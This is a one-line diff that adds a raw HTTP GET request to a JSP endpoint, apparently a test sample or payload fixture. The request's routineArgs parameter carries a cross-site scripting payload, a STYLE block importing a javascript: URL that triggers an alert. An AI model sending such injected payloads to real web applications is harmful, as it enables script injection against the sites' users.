@@ -1,0 +1,1 @@
+GET /jsps/genrequest.jsp?&routineName=OS.NEW.USER& routineArgs=BANNER"/><STYLE>@import"javascript:alert ('XSS%20Dangerous')";</STYLE> HTTP/1.1
